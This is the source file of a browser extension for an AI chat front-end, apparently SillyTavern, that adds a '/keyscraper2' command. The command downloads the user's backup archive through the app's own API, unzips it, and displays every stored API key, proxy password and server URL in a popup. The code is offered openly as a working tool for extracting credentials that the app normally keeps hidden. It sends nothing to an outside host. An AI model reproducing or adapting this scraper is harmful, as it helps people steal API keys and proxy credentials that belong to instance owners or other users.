import { callGenericPopup, POPUP_TYPE } from '../../../popup.js';
import { SlashCommand } from '../../../slash-commands/SlashCommand.js';
import { SlashCommandParser } from '../../../slash-commands/SlashCommandParser.js';

const loadJSZip = () => {
    return new Promise((resolve, reject) => {
        if (window.JSZip) {
            resolve(window.JSZip);
            return;
        }

        console.log("Injecting JSZip script...");
        const script = document.createElement('script');
        script.src = '/lib/jszip.min.js';
        script.onload = () => {
            console.log("JSZip loaded successfully.");
            resolve(window.JSZip);
        };
        script.onerror = (e) => {
            console.error("Failed to load JSZip script.", e);
            reject(e);
        };
        document.head.appendChild(script);
    });
};

const getKeysFromBackup = async () => {
    try {
        await loadJSZip();
        if (!window.JSZip) throw new Error("JSZip library not found after loading attempt.");
        const JSZip = window.JSZip;

        console.log("Fetching user info...");
        const meResponse = await fetch('/api/users/me');
        if (!meResponse.ok) throw new Error(`Failed to get user info: ${meResponse.statusText}`);
        const meData = await meResponse.json();
        const handle = meData.handle;
        console.log("User handle:", handle);

        console.log("Requesting backup...");

        const blob = await new Promise((resolve, reject) => {
            $.ajax({
                url: '/api/users/backup',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ handle: handle }),
                xhrFields: {
                    responseType: 'blob'
                },
                success: (data) => {
                    console.log("Backup received.");
                    resolve(data);
                },
                error: (xhr, status, error) => {
                    console.error("Backup failed", xhr, status, error);
                    reject(new Error(`Backup request failed: ${error || status}`));
                }
            });
        });

        console.log("Backup blob received, size:", blob.size);

        const zip = new JSZip();
        const loadedZip = await zip.loadAsync(blob);
        console.log("Zip loaded.");

        let secretsFile = loadedZip.file('secrets.json');

        if (!secretsFile) {
            const files = Object.keys(loadedZip.files);
            const foundPath = files.find(f => f.endsWith('secrets.json') && !f.includes('__MACOSX'));

            if (foundPath) {
                secretsFile = loadedZip.file(foundPath);
            }
        }

        if (!secretsFile) throw new Error("secrets.json not found in the backup archive.");

        const secretsContent = await secretsFile.async('string');
        const secrets = JSON.parse(secretsContent);

        let settingsFile = loadedZip.file('settings.json');
        if (!settingsFile) {
             const files = Object.keys(loadedZip.files);
             const foundPath = files.find(f => f.endsWith('settings.json') && !f.includes('__MACOSX'));
             if (foundPath) settingsFile = loadedZip.file(foundPath);
        }

        let settings = {};
        if (settingsFile) {
            try {
                const settingsContent = await settingsFile.async('string');
                settings = JSON.parse(settingsContent);
            } catch (e) {
                console.error("Failed to parse settings.json", e);
            }
        }

        let output = "--- Extracted Secrets ---\n\n";
        let count = 0;
        for (const [key, val] of Object.entries(secrets)) {
            if (Array.isArray(val) && val.length > 0) {
                 output += `${key}:\n`;
                 val.forEach(v => {
                     output += `  Label: ${v.label}\n`;
                     output += `  Value: ${v.value}\n`;
                     output += `  Active: ${v.active ? 'Yes' : 'No'}\n`;
                 });
                 output += "\n";
                 count++;
            } else if (typeof val === 'string' && val.trim()) {
                output += `${key}: ${val}\n`;
                count++;
            }
        }

        if (count === 0) {
            output += "No secrets found in the file.\n";
        }

        let extraInfo = "\n--- Settings & Proxies ---\n";
        let hasSettings = false;

        if (settings.oai_settings) {
            const oai = settings.oai_settings;
            if (oai.reverse_proxy) {
                extraInfo += `Reverse Proxy (Active): ${oai.reverse_proxy}\n`;
                if (oai.proxy_password) extraInfo += `Password: ${oai.proxy_password}\n`;
                hasSettings = true;
            }
            if (oai.custom_url) {
                extraInfo += `Custom URL (Chat): ${oai.custom_url}\n`;
                hasSettings = true;
            }
            if (oai.proxies && Array.isArray(oai.proxies) && oai.proxies.length > 0) {
                extraInfo += `\nSaved Proxies:\n`;
                oai.proxies.forEach(p => {
                    extraInfo += `  Name: ${p.name || 'Unnamed'}\n`;
                    extraInfo += `  URL: ${p.url}\n`;
                    if (p.password) extraInfo += `  Password: ${p.password}\n`;
                    extraInfo += `\n`;
                });
                hasSettings = true;
            }
        }

        if (settings.textgenerationwebui_settings && settings.textgenerationwebui_settings.server_urls) {
             const urls = settings.textgenerationwebui_settings.server_urls;
             if (Object.keys(urls).length > 0) {
                 extraInfo += `\nTextGen Server URLs:\n`;
                 for (const [type, url] of Object.entries(urls)) {
                     if (url) {
                         extraInfo += `  ${type}: ${url}\n`;
                         hasSettings = true;
                     }
                 }
             }
        }

        if (hasSettings) {
            output += extraInfo;
        }

        return output;

    } catch (e) {
        console.error("Error:", e);
        return `Error during scraping: ${e.message}\n\nPlease check the browser console (F12) for more details.`;
    }
};

const showScraperPopup = () => {
    const container = $('<div class="key-scraper-v2-settings" style="padding: 10px;"></div>');
    const btn = $('<button class="menu_button">Scrape All Keys via Backup</button>');
    const output = $('<textarea id="key-scraper-v2-output" rows="20" class="text_pole" style="width:100%; margin-top:10px; font-family: monospace; white-space: pre;" readonly></textarea>');

    btn.on('click', async () => {
        output.val("Starting scraping process...\n\n1. Fetching user info...\n2. Requesting backup archive...\n3. Downloading and unzipping...\n4. Extracting secrets.json...\n\nGonvno Banan Pirat...");

        setTimeout(async () => {
            const result = await getKeysFromBackup();
            output.val(result);
        }, 100);
    });

    container.append(btn).append(output);
    callGenericPopup(container, POPUP_TYPE.TEXT, '', { wide: true, large: true });
};

const registerCommand = () => {
    try {
        SlashCommandParser.addCommandObject(SlashCommand.fromProps({
            name: 'keyscraper2',
            callback: () => {
                showScraperPopup();
                return "";
            },
            helpString: "Opens the Key Scraper V2 popup (Backup Method)."
        }));
        console.log("/keyscraper2 command registered successfully.");
    } catch (e) {
        console.error("Failed to register command.", e);
    }
};

jQuery(() => {
    console.log("Extension loaded.");
    registerCommand();
});
